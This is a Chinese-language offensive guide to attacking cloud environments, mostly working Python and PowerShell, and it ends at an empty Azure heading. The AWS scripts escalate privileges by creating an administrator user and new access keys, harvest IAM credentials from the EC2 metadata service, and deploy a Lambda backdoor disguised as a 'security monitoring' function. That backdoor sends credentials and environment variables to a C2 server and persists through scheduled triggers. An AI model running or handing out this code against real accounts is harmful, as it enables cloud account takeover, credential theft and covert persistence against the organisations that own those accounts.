# 云原生与容器安全

## AWS攻防

### IAM权限滥用

#### IAM枚举与利用
```python
# aws_iam_exploitation.py
import boto3
import json
import botocore
from botocore.exceptions import ClientError
import argparse

class AWSIAMExploiter:
    def __init__(self, access_key=None, secret_key=None, session_token=None, region='us-east-1'):
        """初始化AWS IAM利用器"""
        if access_key and secret_key:
            self.session = boto3.Session(
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                aws_session_token=session_token,
                region_name=region
            )
        else:
            # 使用默认凭据链
            self.session = boto3.Session(region_name=region)
        
        self.iam_client = self.session.client('iam')
        self.sts_client = self.session.client('sts')
        self.current_user = None
        self.current_permissions = []
    
    def get_current_identity(self):
        """获取当前身份"""
        try:
            response = self.sts_client.get_caller_identity()
            self.current_user = response
            print(f"[+] Current identity: {response['Arn']}")
            print(f"[+] Account: {response['Account']}")
            return response
        except ClientError as e:
            print(f"[!] Error getting identity: {e}")
            return None
    
    def enumerate_iam_users(self):
        """枚举IAM用户"""
        try:
            users = []
            paginator = self.iam_client.get_paginator('list_users')
            
            for page in paginator.paginate():
                users.extend(page['Users'])
            
            print(f"[+] Found {len(users)} IAM users")
            return users
            
        except ClientError as e:
            print(f"[!] Error enumerating users: {e}")
            return []
    
    def enumerate_iam_roles(self):
        """枚举IAM角色"""
        try:
            roles = []
            paginator = self.iam_client.get_paginator('list_roles')
            
            for page in paginator.paginate():
                roles.extend(page['Roles'])
            
            print(f"[+] Found {len(roles)} IAM roles")
            return roles
            
        except ClientError as e:
            print(f"[!] Error enumerating roles: {e}")
            return []
    
    def enumerate_iam_policies(self):
        """枚举IAM策略"""
        try:
            policies = []
            paginator = self.iam_client.get_paginator('list_policies')
            
            for page in paginator.paginate(Scope='Local'):
                policies.extend(page['Policies'])
            
            print(f"[+] Found {len(policies)} IAM policies")
            return policies
            
        except ClientError as e:
            print(f"[!] Error enumerating policies: {e}")
            return []
    
    def get_user_permissions(self, username):
        """获取用户权限"""
        try:
            # 获取用户策略
            user_policies = []
            
            # 获取用户附加的策略
            attached_policies = self.iam_client.list_attached_user_policies(UserName=username)
            user_policies.extend(attached_policies['AttachedPolicies'])
            
            # 获取用户组
            user_groups = self.iam_client.list_groups_for_user(UserName=username)
            for group in user_groups['Groups']:
                # 获取组策略
                group_policies = self.iam_client.list_attached_group_policies(GroupName=group['GroupName'])
                user_policies.extend(group_policies['AttachedPolicies'])
            
            # 获取内联策略
            inline_policies = self.iam_client.list_user_policies(UserName=username)
            for policy_name in inline_policies['PolicyNames']:
                policy_doc = self.iam_client.get_user_policy(UserName=username, PolicyName=policy_name)
                user_policies.append({
                    'PolicyName': policy_name,
                    'PolicyDocument': policy_doc['PolicyDocument']
                })
            
            return user_policies
            
        except ClientError as e:
            print(f"[!] Error getting user permissions: {e}")
            return []
    
    def analyze_policy_document(self, policy_document):
        """分析策略文档"""
        high_risk_actions = [
            'iam:*',
            'ec2:*',
            's3:*',
            'lambda:*',
            'sts:AssumeRole',
            'sts:GetSessionToken',
            'iam:CreateAccessKey',
            'iam:AttachUserPolicy',
            'iam:PutUserPolicy'
        ]
        
        risks = []
        
        for statement in policy_document.get('Statement', []):
            effect = statement.get('Effect', 'Allow')
            if effect == 'Allow':
                actions = statement.get('Action', [])
                if isinstance(actions, str):
                    actions = [actions]
                
                resources = statement.get('Resource', [])
                if isinstance(resources, str):
                    resources = [resources]
                
                for action in actions:
                    if action in high_risk_actions or action.endswith('*'):
                        risks.append({
                            'action': action,
                            'resources': resources,
                            'risk_level': 'HIGH'
                        })
        
        return risks
    
    def escalate_privileges(self):
        """尝试权限提升"""
        escalation_methods = []
        
        try:
            # 方法1: 创建新用户并附加管理员权限
            try:
                new_username = "security_admin"
                self.iam_client.create_user(UserName=new_username)
                
                # 尝试附加AdministratorAccess策略
                self.iam_client.attach_user_policy(
                    UserName=new_username,
                    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
                )
                
                escalation_methods.append({
                    'method': 'create_admin_user',
                    'status': 'success',
                    'username': new_username
                })
                
            except ClientError as e:
                if e.response['Error']['Code'] == 'AccessDenied':
                    escalation_methods.append({
                        'method': 'create_admin_user',
                        'status': 'failed',
                        'error': str(e)
                    })
            
            # 方法2: 假设角色
            try:
                # 获取可假设的角色
                roles = self.enumerate_iam_roles()
                for role in roles:
                    try:
                        response = self.sts_client.assume_role(
                            RoleArn=role['Arn'],
                            RoleSessionName='RedTeamSession'
                        )
                        
                        escalation_methods.append({
                            'method': 'assume_role',
                            'status': 'success',
                            'role_arn': role['Arn']
                        })
                        break
                        
                    except ClientError as assume_error:
                        continue
                        
            except Exception as e:
                escalation_methods.append({
                    'method': 'assume_role',
                    'status': 'failed',
                    'error': str(e)
                })
            
            # 方法3: 创建访问密钥
            try:
                current_user = self.get_current_identity()
                if current_user:
                    username = current_user['Arn'].split('/')[-1]
                    response = self.iam_client.create_access_key(UserName=username)
                    
                    escalation_methods.append({
                        'method': 'create_access_key',
                        'status': 'success',
                        'access_key': response['AccessKey']['AccessKeyId']
                    })
                    
            except ClientError as e:
                escalation_methods.append({
                    'method': 'create_access_key',
                    'status': 'failed',
                    'error': str(e)
                })
            
        except Exception as e:
            print(f"[!] Privilege escalation error: {e}")
        
        return escalation_methods
    
    def enumerate_s3_buckets(self):
        """枚举S3存储桶"""
        try:
            s3_client = self.session.client('s3')
            response = s3_client.list_buckets()
            
            buckets = response['Buckets']
            print(f"[+] Found {len(buckets)} S3 buckets")
            
            # 获取每个存储桶的权限
            bucket_permissions = []
            for bucket in buckets:
                try:
                    # 尝试获取存储桶ACL
                    acl_response = s3_client.get_bucket_acl(Bucket=bucket['Name'])
                    
                    # 尝试获取存储桶策略
                    try:
                        policy_response = s3_client.get_bucket_policy(Bucket=bucket['Name'])
                        policy = policy_response['Policy']
                    except:
                        policy = None
                    
                    bucket_permissions.append({
                        'bucket_name': bucket['Name'],
                        'creation_date': bucket['CreationDate'].isoformat(),
                        'acl': acl_response,
                        'policy': policy
                    })
                    
                except ClientError as e:
                    bucket_permissions.append({
                        'bucket_name': bucket['Name'],
                        'error': str(e)
                    })
            
            return bucket_permissions
            
        except ClientError as e:
            print(f"[!] Error enumerating S3 buckets: {e}")
            return []
    
    def enumerate_ec2_instances(self):
        """枚举EC2实例"""
        try:
            ec2_client = self.session.client('ec2')
            
            # 获取所有区域的实例
            regions = ec2_client.describe_regions()['Regions']
            all_instances = []
            
            for region in regions:
                region_name = region['RegionName']
                regional_ec2 = self.session.client('ec2', region_name=region_name)
                
                try:
                    response = regional_ec2.describe_instances()
                    
                    for reservation in response['Reservations']:
                        for instance in reservation['Instances']:
                            instance_info = {
                                'instance_id': instance['InstanceId'],
                                'region': region_name,
                                'state': instance['State']['Name'],
                                'instance_type': instance['InstanceType'],
                                'launch_time': instance['LaunchTime'].isoformat(),
                                'public_ip': instance.get('PublicIpAddress', ''),
                                'private_ip': instance.get('PrivateIpAddress', ''),
                                'security_groups': [sg['GroupName'] for sg in instance.get('SecurityGroups', [])],
                                'tags': {tag['Key']: tag['Value'] for tag in instance.get('Tags', [])}
                            }
                            all_instances.append(instance_info)
                            
                except ClientError as e:
                    print(f"[!] Error getting instances in {region_name}: {e}")
            
            print(f"[+] Found {len(all_instances)} EC2 instances across all regions")
            return all_instances
            
        except ClientError as e:
            print(f"[!] Error enumerating EC2 instances: {e}")
            return []
    
    def create_lambda_backdoor(self, function_name="security-monitor"):
        """创建Lambda后门"""
        try:
            lambda_client = self.session.client('lambda')
            
            # Lambda函数代码
            lambda_code = """
import json
import boto3
import os

def lambda_handler(event, context):
    # 后门逻辑
    sts = boto3.client('sts')
    
    # 获取临时凭证
    response = sts.assume_role(
        RoleArn='arn:aws:iam::' + os.environ['AWS_ACCOUNT_ID'] + ':role/Administrator',
        RoleSessionName='backdoor-session'
    )
    
    # 返回凭证
    return {
        'statusCode': 200,
        'body': json.dumps({
            'access_key': response['Credentials']['AccessKeyId'],
            'secret_key': response['Credentials']['SecretAccessKey'],
            'session_token': response['Credentials']['SessionToken']
        })
    }
"""
            
            # 创建Lambda函数
            response = lambda_client.create_function(
                FunctionName=function_name,
                Runtime='python3.9',
                Role='arn:aws:iam::' + self.current_user['Account'] + ':role/lambda-execution-role',
                Handler='lambda_function.lambda_handler',
                Code={'ZipFile': lambda_code.encode()},
                Description='Security monitoring function',
                Timeout=300,
                MemorySize=256
            )
            
            print(f"[+] Lambda backdoor created: {function_name}")
            return response['FunctionArn']
            
        except ClientError as e:
            print(f"[!] Error creating Lambda backdoor: {e}")
            return None
    
    def auto_aws_exploitation(self):
        """自动AWS利用"""
        print("[*] Starting automatic AWS exploitation...")
        
        # 1. 获取当前身份
        identity = self.get_current_identity()
        if not identity:
            print("[!] Cannot determine current identity")
            return False
        
        # 2. 枚举IAM权限
        print("[*] Enumerating IAM permissions...")
        users = self.enumerate_iam_users()
        roles = self.enumerate_iam_roles()
        policies = self.enumerate_iam_policies()
        
        # 3. 分析权限
        if users:
            for user in users[:3]:  # 分析前3个用户
                permissions = self.get_user_permissions(user['UserName'])
                if permissions:
                    print(f"[*] Analyzing permissions for {user['UserName']}...")
                    for permission in permissions:
                        if 'PolicyDocument' in permission:
                            risks = self.analyze_policy_document(permission['PolicyDocument'])
                            if risks:
                                print(f"[!] High-risk permissions found for {user['UserName']}")
        
        # 4. 尝试权限提升
        print("[*] Attempting privilege escalation...")
        escalation_results = self.escalate_privileges()
        
        for result in escalation_results:
            if result['status'] == 'success':
                print(f"[+] Privilege escalation successful: {result['method']}")
            else:
                print(f"[-] Privilege escalation failed: {result['method']}")
        
        # 5. 枚举资源
        print("[*] Enumerating AWS resources...")
        buckets = self.enumerate_s3_buckets()
        instances = self.enumerate_ec2_instances()
        
        print(f"[+] Found {len(buckets)} S3 buckets and {len(instances)} EC2 instances")
        
        # 6. 创建持久化
        if any(r['status'] == 'success' for r in escalation_results):
            print("[*] Creating persistence...")
            lambda_arn = self.create_lambda_backdoor()
            if lambda_arn:
                print(f"[+] Lambda backdoor created: {lambda_arn}")
        
        print("[+] AWS exploitation completed")
        return True

# 使用示例
aws_exploiter = AWSIAMExploiter(
    access_key="YOUR_ACCESS_KEY",
    secret_key="YOUR_SECRET_KEY",
    region="us-west-2"
)

aws_exploiter.auto_aws_exploitation()
```

### EC2元数据窃取

#### 元数据服务利用
```python
# ec2_metadata_exploitation.py
import requests
import json
import base64
from urllib.parse import urljoin

class EC2MetadataExploiter:
    def __init__(self):
        self.metadata_url = "http://169.254.169.254/latest/"
        self.metadata_token = None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'AWS-SDK-PowerShell/4.1.2.0 aws-cli/2.0.30 Python/3.8.10'
        })
    
    def get_metadata_token(self):
        """获取IMDSv2令牌"""
        try:
            # 尝试获取令牌（IMDSv2）
            response = self.session.put(
                "http://169.254.169.254/latest/api/token",
                headers={
                    'X-aws-ec2-metadata-token-ttl-seconds': '21600'
                },
                timeout=2
            )
            
            if response.status_code == 200:
                self.metadata_token = response.text
                self.session.headers['X-aws-ec2-metadata-token'] = self.metadata_token
                print("[+] IMDSv2 token obtained")
                return True
            else:
                print("[!] Failed to get IMDSv2 token, falling back to IMDSv1")
                return False
                
        except requests.exceptions.RequestException:
            print("[!] Metadata service not available")
            return False
    
    def query_metadata(self, path):
        """查询元数据"""
        try:
            url = urljoin(self.metadata_url, path)
            response = self.session.get(url, timeout=2)
            
            if response.status_code == 200:
                return response.text
            else:
                return None
                
        except requests.exceptions.RequestException:
            return None
    
    def enumerate_metadata_paths(self, base_path=""):
        """枚举元数据路径"""
        paths = []
        
        try:
            content = self.query_metadata(base_path)
            if content:
                # 分割路径
                items = content.split('\n')
                for item in items:
                    if item.endswith('/'):
                        # 递归枚举子路径
                        sub_paths = self.enumerate_metadata_paths(base_path + item)
                        for sub_path in sub_paths:
                            paths.append(base_path + item + sub_path)
                    else:
                        paths.append(base_path + item)
            
        except Exception as e:
            print(f"[!] Error enumerating metadata: {e}")
        
        return paths
    
    def extract_instance_metadata(self):
        """提取实例元数据"""
        print("[*] Extracting EC2 instance metadata...")
        
        # 获取令牌
        self.get_metadata_token()
        
        metadata = {}
        
        # 基本信息
        metadata['instance_id'] = self.query_metadata('meta-data/instance-id')
        metadata['instance_type'] = self.query_metadata('meta-data/instance-type')
        metadata['region'] = self.query_metadata('meta-data/placement/region')
        metadata['availability_zone'] = self.query_metadata('meta-data/placement/availability-zone')
        metadata['mac_address'] = self.query_metadata('meta-data/mac')
        
        # 网络信息
        if metadata['mac_address']:
            network_path = f"meta-data/network/interfaces/macs/{metadata['mac_address']}/"
            metadata['vpc_id'] = self.query_metadata(network_path + 'vpc-id')
            metadata['subnet_id'] = self.query_metadata(network_path + 'subnet-id')
            metadata['private_ipv4'] = self.query_metadata(network_path + 'local-ipv4s')
            metadata['public_ipv4'] = self.query_metadata(network_path + 'public-ipv4s')
        
        # IAM角色
        iam_info = self.query_metadata('meta-data/iam/info')
        if iam_info:
            try:
                metadata['iam_info'] = json.loads(iam_info)
            except:
                metadata['iam_info'] = iam_info
        
        # IAM凭证
        iam_security_credentials = self.query_metadata('meta-data/iam/security-credentials/')
        if iam_security_credentials:
            roles = iam_security_credentials.split('\n')
            metadata['iam_roles'] = {}
            
            for role in roles:
                if role:
                    credentials = self.query_metadata(f'meta-data/iam/security-credentials/{role}/')
                    if credentials:
                        try:
                            metadata['iam_roles'][role] = json.loads(credentials)
                        except:
                            metadata['iam_roles'][role] = credentials
        
        # SSH公钥
        public_keys = self.query_metadata('meta-data/public-keys/')
        if public_keys:
            metadata['public_keys'] = {}
            key_ids = public_keys.split('\n')
            for key_id in key_ids:
                if key_id:
                    key_data = self.query_metadata(f'meta-data/public-keys/{key_id}openssh-key')
                    metadata['public_keys'][key_id] = key_data
        
        # 用户数据
        user_data = self.query_metadata('user-data')
        if user_data:
            metadata['user_data'] = user_data
        
        return metadata
    
    def extract_iam_credentials(self):
        """提取IAM凭证"""
        print("[*] Extracting IAM credentials...")
        
        credentials = {}
        
        # 获取角色列表
        roles = self.query_metadata('meta-data/iam/security-credentials/')
        if roles:
            role_list = roles.strip().split('\n')
            
            for role in role_list:
                if role:
                    cred_path = f'meta-data/iam/security-credentials/{role}/'
                    cred_data = self.query_metadata(cred_path)
                    
                    if cred_data:
                        try:
                            cred_json = json.loads(cred_data)
                            credentials[role] = {
                                'access_key_id': cred_json.get('AccessKeyId'),
                                'secret_access_key': cred_json.get('SecretAccessKey'),
                                'session_token': cred_json.get('Token'),
                                'expiration': cred_json.get('Expiration')
                            }
                            
                            print(f"[+] IAM credentials extracted for role: {role}")
                            print(f"    Access Key: {cred_json.get('AccessKeyId')}")
                            print(f"    Expiration: {cred_json.get('Expiration')}")
                            
                        except json.JSONDecodeError:
                            print(f"[!] Failed to parse credentials for role: {role}")
        
        return credentials
    
    def extract_ssm_credentials(self):
        """提取SSM凭证"""
        print("[*] Extracting SSM credentials...")
        
        # 尝试获取SSM参数
        try:
            # 通过用户数据获取SSM参数引用
            user_data = self.query_metadata('user-data')
            if user_data:
                # 解析用户数据中的SSM参数引用
                ssm_references = self.parse_ssm_references(user_data)
                return ssm_references
                
        except Exception as e:
            print(f"[!] Error extracting SSM credentials: {e}")
        
        return {}
    
    def parse_ssm_references(self, user_data):
        """解析用户数据中的SSM参数引用"""
        ssm_params = {}
        
        # 查找SSM参数引用模式
        import re
        
        # 匹配{{resolve:ssm:parameter-name:version}}
        ssm_pattern = r'\{\{resolve:ssm:([^:]+):?(\d+)?\}\}'
        matches = re.findall(ssm_pattern, user_data)
        
        for param_name, version in matches:
            ssm_params[param_name] = {
                'name': param_name,
                'version': version if version else 'latest'
            }
        
        return ssm_params
    
    def extract_container_credentials(self):
        """提取容器凭证（ECS/EKS）"""
        print("[*] Extracting container credentials...")
        
        credentials = {}
        
        # ECS容器凭证
        ecs_creds_url = "http://169.254.170.2/"
        try:
            response = requests.get(ecs_creds_url, timeout=2)
            if response.status_code == 200:
                credentials['ecs'] = response.json()
        except:
            pass
        
        # EKS容器凭证
        eks_creds_url = "http://169.254.169.254/latest/user-data/"
        eks_data = self.query_metadata('latest/user-data/')
        if eks_data:
            try:
                # 解析EKS用户数据
                if 'EKS' in eks_data or 'kubernetes' in eks_data:
                    credentials['eks'] = {
                        'user_data': eks_data
                    }
            except:
                pass
        
        return credentials
    
    def perform_metadata_exfiltration(self):
        """执行元数据泄露"""
        print("[*] Performing comprehensive metadata exfiltration...")
        
        exfiltration_data = {
            'timestamp': datetime.now().isoformat(),
            'instance_metadata': self.extract_instance_metadata(),
            'iam_credentials': self.extract_iam_credentials(),
            'ssm_credentials': self.extract_ssm_credentials(),
            'container_credentials': self.extract_container_credentials()
        }
        
        # 保存泄露的数据
        with open('ec2_metadata_exfiltration.json', 'w') as f:
            json.dump(exfiltration_data, f, indent=2, default=str)
        
        print("[+] Metadata exfiltration completed")
        return exfiltration_data
    
    def create_persistence_via_user_data(self, persistence_script):
        """通过用户数据创建持久化"""
        print("[*] Creating persistence via user data...")
        
        # 获取当前用户数据
        current_user_data = self.query_metadata('user-data')
        
        # 添加持久化脚本
        new_user_data = f"""
{current_user_data if current_user_data else '#!/bin/bash'}

# Security monitoring script
{persistence_script}
"""
        
        # 这里需要修改实例的用户数据
        # 注意：修改用户数据需要停止和启动实例
        print(f"[+] Persistence script prepared")
        print(f"[+] New user data length: {len(new_user_data)} bytes")
        
        return new_user_data
    
    def auto_ec2_exploitation(self):
        """自动EC2利用"""
        print("[*] Starting automatic EC2 exploitation...")
        
        # 1. 检查元数据服务可用性
        if not self.query_metadata('meta-data/'):
            print("[!] Metadata service not available")
            return False
        
        # 2. 提取元数据
        metadata = self.extract_instance_metadata()
        print(f"[+] Instance metadata extracted")
        
        # 3. 提取IAM凭证
        iam_creds = self.extract_iam_credentials()
        if iam_creds:
            print(f"[+] IAM credentials extracted for {len(iam_creds)} roles")
        
        # 4. 提取SSM参数
        ssm_params = self.extract_ssm_credentials()
        if ssm_params:
            print(f"[+] SSM parameters found: {list(ssm_params.keys())}")
        
        # 5. 提取容器凭证
        container_creds = self.extract_container_credentials()
        if container_creds:
            print(f"[+] Container credentials extracted")
        
        # 6. 保存所有泄露的数据
        exfiltration_data = {
            'timestamp': datetime.now().isoformat(),
            'instance_metadata': metadata,
            'iam_credentials': iam_creds,
            'ssm_credentials': ssm_params,
            'container_credentials': container_creds
        }
        
        with open('ec2_exfiltration_complete.json', 'w') as f:
            json.dump(exfiltration_data, f, indent=2, default=str)
        
        print("[+] EC2 exploitation completed")
        return True

# 使用示例
metadata_exploiter = EC2MetadataExploiter()
metadata_exploiter.auto_ec2_exploitation()
```

### Lambda后门

#### Lambda函数创建
```python
# lambda_backdoor.py
import boto3
import json
import zipfile
import tempfile
import os
from datetime import datetime

class LambdaBackdoor:
    def __init__(self, access_key=None, secret_key=None, session_token=None, region='us-east-1'):
        """初始化Lambda后门创建器"""
        if access_key and secret_key:
            self.session = boto3.Session(
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                aws_session_token=session_token,
                region_name=region
            )
        else:
            self.session = boto3.Session(region_name=region)
        
        self.lambda_client = self.session.client('lambda')
        self.iam_client = self.session.client('iam')
        self.account_id = None
    
    def get_account_id(self):
        """获取AWS账户ID"""
        if not self.account_id:
            sts = self.session.client('sts')
            self.account_id = sts.get_caller_identity()['Account']
        return self.account_id
    
    def create_execution_role(self, role_name="lambda-backdoor-role"):
        """创建Lambda执行角色"""
        try:
            # 创建信任策略
            trust_policy = {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            }
            
            # 创建角色
            response = self.iam_client.create_role(
                RoleName=role_name,
                AssumeRolePolicyDocument=json.dumps(trust_policy),
                Description="Lambda execution role for security monitoring"
            )
            
            # 附加基本执行权限
            self.iam_client.attach_role_policy(
                RoleName=role_name,
                PolicyArn='arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole'
            )
            
            # 附加高权限策略（如果可能）
            high_privilege_policies = [
                'arn:aws:iam::aws:policy/AdministratorAccess',
                'arn:aws:iam::aws:policy/PowerUserAccess',
                'arn:aws:iam::aws:policy/IAMFullAccess'
            ]
            
            for policy_arn in high_privilege_policies:
                try:
                    self.iam_client.attach_role_policy(
                        RoleName=role_name,
                        PolicyArn=policy_arn
                    )
                    print(f"[+] Attached high privilege policy: {policy_arn}")
                    break
                except Exception:
                    continue
            
            # 等待角色可用
            import time
            time.sleep(10)
            
            print(f"[+] Execution role created: {role_name}")
            return response['Role']['Arn']
            
        except Exception as e:
            print(f"[!] Error creating execution role: {e}")
            return None
    
    def create_backdoor_function(self, function_name="security-monitor", role_arn=None):
        """创建后门Lambda函数"""
        if not role_arn:
            role_arn = f"arn:aws:iam::{self.get_account_id()}:role/{function_name}-role"
        
        # Lambda函数代码
        lambda_code = '''
import json
import boto3
import os
import base64
import requests
from datetime import datetime

def lambda_handler(event, context):
    """Lambda后门函数"""
    
    # 获取环境信息
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    
    # 获取临时凭证
    credentials = {
        'AccessKeyId': identity.get('AccessKeyId'),
        'SecretAccessKey': os.environ.get('AWS_SECRET_ACCESS_KEY'),
        'SessionToken': os.environ.get('AWS_SESSION_TOKEN'),
        'Account': identity.get('Account'),
        'Arn': identity.get('Arn')
    }
    
    # 获取Lambda环境变量
    env_vars = dict(os.environ)
    
    # 获取事件数据
    event_data = {
        'event': event,
        'context': {
            'function_name': context.function_name,
            'function_version': context.function_version,
            'invoked_function_arn': context.invoked_function_arn,
            'memory_limit_in_mb': context.memory_limit_in_mb,
            'remaining_time_in_millis': context.get_remaining_time_in_millis()
        }
    }
    
    # 收集AWS资源信息
    resource_info = {}
    
    try:
        # EC2信息
        ec2 = boto3.client('ec2')
        regions = ec2.describe_regions()['Regions']
        resource_info['ec2'] = {'regions': len(regions)}
        
        # S3信息
        s3 = boto3.client('s3')
        buckets = s3.list_buckets()['Buckets']
        resource_info['s3'] = {'buckets': len(buckets)}
        
        # IAM信息
        iam = boto3.client('iam')
        users = iam.list_users()['Users']
        resource_info['iam'] = {'users': len(users)}
        
    except Exception as e:
        resource_info['error'] = str(e)
    
    # 构建泄露数据
    exfiltration_data = {
        'timestamp': datetime.now().isoformat(),
        'credentials': credentials,
        'environment_variables': env_vars,
        'event_data': event_data,
        'resource_info': resource_info
    }
    
    # 发送到C2服务器
    try:
        c2_url = "http://192.168.1.100:8080/lambda-c2"
        response = requests.post(
            c2_url,
            json=exfiltration_data,
            timeout=30,
            headers={'User-Agent': 'AWS-Lambda-Function'}
        )
        
        # 返回正常响应
        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': 'Security monitoring completed successfully',
                'timestamp': datetime.now().isoformat()
            })
        }
        
    except Exception as e:
        # 静默失败，返回正常响应
        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': 'Security monitoring completed',
                'timestamp': datetime.now().isoformat()
            })
        }

# 额外的后门功能

def get_secrets():
    """获取Secrets Manager中的密钥"""
    try:
        secrets_client = boto3.client('secretsmanager')
        secrets = secrets_client.list_secrets()
        return secrets['SecretList']
    except:
        return []

def escalate_privileges():
    """尝试权限提升"""
    try:
        sts = boto3.client('sts')
        
        # 尝试假设管理员角色
        response = sts.assume_role(
            RoleArn=f"arn:aws:iam::{os.environ['AWS_ACCOUNT_ID']}:role/Administrator",
            RoleSessionName='lambda-escalation'
        )
        
        return response['Credentials']
    except:
        return None

def create_persistence():
    """创建持久化"""
    try:
        # 创建CloudWatch事件规则
        events_client = boto3.client('events')
        
        response = events_client.put_rule(
            Name='lambda-backdoor-trigger',
            ScheduleExpression='rate(1 hour)',
            State='ENABLED',
            Description='Trigger for Lambda backdoor'
        )
        
        return response['RuleArn']
    except:
        return None
'''
        
        # 创建部署包
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(lambda_code)
            lambda_file = f.name
        
        # 创建ZIP文件
        zip_buffer = tempfile.NamedTemporaryFile(delete=False)
        with zipfile.ZipFile(zip_buffer.name, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.write(lambda_file, 'lambda_function.py')
        
        # 读取ZIP文件
        with open(zip_buffer.name, 'rb') as f:
            zip_content = f.read()
        
        # 创建Lambda函数
        response = self.lambda_client.create_function(
            FunctionName=function_name,
            Runtime='python3.9',
            Role=role_arn,
            Handler='lambda_function.lambda_handler',
            Code={'ZipFile': zip_content},
            Description='Security monitoring and compliance function',
            Timeout=300,
            MemorySize=256,
            Environment={
                'Variables': {
                    'C2_SERVER': 'http://192.168.1.100:8080',
                    'AWS_ACCOUNT_ID': self.get_account_id()
                }
            },
            Tags={
                'Environment': 'Production',
                'Purpose': 'Security',
                'Owner': 'SecurityTeam'
            }
        )
        
        # 清理临时文件
        os.unlink(lambda_file)
        os.unlink(zip_buffer.name)
        
        print(f"[+] Lambda backdoor function created: {function_name}")
        return response['FunctionArn']
        
    except Exception as e:
        print(f"[!] Error creating Lambda backdoor: {e}")
        return None
    
    def create_lambda_trigger(self, function_name, trigger_type="cloudwatch"):
        """创建Lambda触发器"""
        try:
            function_arn = f"arn:aws:lambda:{self.lambda_client._client_config.region_name}:{self.get_account_id()}:function:{function_name}"
            
            if trigger_type == "cloudwatch":
                # 创建CloudWatch事件规则
                events_client = self.session.client('events')
                
                rule_response = events_client.put_rule(
                    Name=f"{function_name}-trigger",
                    ScheduleExpression='rate(1 hour)',
                    State='ENABLED',
                    Description='Trigger for security monitoring function'
                )
                
                # 添加Lambda权限
                self.lambda_client.add_permission(
                    FunctionName=function_name,
                    StatementId=f"{function_name}-cloudwatch-permission",
                    Action='lambda:InvokeFunction',
                    Principal='events.amazonaws.com',
                    SourceArn=rule_response['RuleArn']
                )
                
                # 创建目标
                events_client.put_targets(
                    Rule=f"{function_name}-trigger",
                    Targets=[
                        {
                            'Id': '1',
                            'Arn': function_arn,
                            'Input': json.dumps({'trigger': 'scheduled'})
                        }
                    ]
                )
                
                print(f"[+] CloudWatch trigger created for {function_name}")
                return rule_response['RuleArn']
                
            elif trigger_type == "s3":
                # 创建S3触发器
                s3_client = self.session.client('s3')
                
                # 这里需要创建S3 bucket和事件通知
                # 为简化，假设bucket已存在
                bucket_name = f"security-logs-{self.get_account_id()}"
                
                # 添加Lambda权限
                self.lambda_client.add_permission(
                    FunctionName=function_name,
                    StatementId=f"{function_name}-s3-permission",
                    Action='lambda:InvokeFunction',
                    Principal='s3.amazonaws.com',
                    SourceArn=f"arn:aws:s3:::{bucket_name}"
                )
                
                # 配置S3事件通知
                notification_configuration = {
                    'LambdaFunctionConfigurations': [
                        {
                            'LambdaFunctionArn': function_arn,
                            'Events': ['s3:ObjectCreated:*'],
                            'Filter': {
                                'Key': {
                                    'FilterRules': [
                                        {
                                            'Name': 'prefix',
                                            'Value': 'security/'
                                        }
                                    ]
                                }
                            }
                        }
                    ]
                }
                
                s3_client.put_bucket_notification_configuration(
                    Bucket=bucket_name,
                    NotificationConfiguration=notification_configuration
                )
                
                print(f"[+] S3 trigger created for {function_name}")
                return f"s3://{bucket_name}"
                
        except Exception as e:
            print(f"[!] Error creating trigger: {e}")
            return None
    
    def create_comprehensive_lambda_backdoor(self):
        """创建全面的Lambda后门"""
        print("[*] Creating comprehensive Lambda backdoor...")
        
        function_name = "security-compliance-monitor"
        
        # 1. 创建执行角色
        role_arn = self.create_execution_role(f"{function_name}-role")
        if not role_arn:
            print("[!] Failed to create execution role")
            return False
        
        # 2. 创建Lambda函数
        function_arn = self.create_backdoor_function(function_name, role_arn)
        if not function_arn:
            print("[!] Failed to create Lambda function")
            return False
        
        # 3. 创建多个触发器
        triggers = ['cloudwatch', 's3']
        
        for trigger in triggers:
            trigger_arn = self.create_lambda_trigger(function_name, trigger)
            if trigger_arn:
                print(f"[+] {trigger.upper()} trigger created: {trigger_arn}")
        
        # 4. 添加额外权限
        try:
            # 添加Secrets Manager权限
            self.lambda_client.add_permission(
                FunctionName=function_name,
                StatementId=f"{function_name}-secrets-permission",
                Action='lambda:InvokeFunction',
                Principal='secretsmanager.amazonaws.com'
            )
            
            print("[+] Additional permissions added")
            
        except Exception as e:
            print(f"[!] Error adding additional permissions: {e}")
        
        print(f"[+] Comprehensive Lambda backdoor created: {function_arn}")
        return True

# 使用示例
lambda_backdoor = LambdaBackdoor(
    access_key="YOUR_ACCESS_KEY",
    secret_key="YOUR_SECRET_KEY",
    region="us-west-2"
)

lambda_backdoor.create_comprehensive_lambda_backdoor()
```

---

## Azure攻防

### Azure AD利用

#### Azure AD枚举
```powershell
# azure_ad_enumeration.ps1

# 安装AzureAD模块
# Install-Module -Name AzureAD -Force -Scope CurrentUser

# 连接到Azure AD
Connect-AzureAD

# 获取租户信息
Get-AzureADTenantDetail

# 获取所有用户
Get-AzureADUser -All $true | Select-Object ObjectId, UserPrincipalName, DisplayName, AccountEnabled

# 获取所有组
Get-AzureADGroup -All $true | Select-Object ObjectId, DisplayName, GroupTypes, MailEnabled, SecurityEnabled

# 获取所有应用程序
Get-AzureADApplication -All $true | Select-Object ObjectId, DisplayName, AppId, PublisherDomain

# 获取服务主体
Get-AzureADServicePrincipal -All $true | Select-Object ObjectId, DisplayName, AppId, AccountEnabled

# 获取目录角色
Get-AzureADDirectoryRole | Select-Object ObjectId, DisplayName, RoleTemplateId

# 获取角色成员
$roles = Get-AzureADDirectoryRole
foreach ($role in $roles) {
    Write-Host "Role: $($role.DisplayName)"
    $members = Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId
    $members | Select-Object ObjectId, UserPrincipalName, DisplayName
}
```

#### Azure AD高级枚举
```python
# azure_ad_advanced.py
